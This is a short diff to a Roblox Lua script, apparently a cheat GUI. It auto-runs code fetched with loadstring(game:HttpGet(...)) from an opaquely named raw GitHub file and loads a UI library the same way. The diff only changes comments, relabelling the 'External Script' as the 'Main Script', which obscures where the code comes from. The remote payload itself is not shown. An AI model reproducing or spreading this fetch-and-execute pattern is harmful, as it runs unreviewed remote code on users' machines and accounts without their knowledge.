@@ -1,7 +1,6 @@
--- Auto-run External Script
+-- Auto-run Main Script
 loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/EGG-PET-METHOD/refs/heads/main/351d51bdaaa9c7ef38c715a8330fc4dd.txt"))()
--- Roblox GUI Script (Rayfield UI Enhanced + Custom Progress Animation)
--- Full-featured GUI with gradient black screen, stroke watermark, slider progress, and smooth transitions
+-- GUI
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local TeleportService = game:GetService("TeleportService")
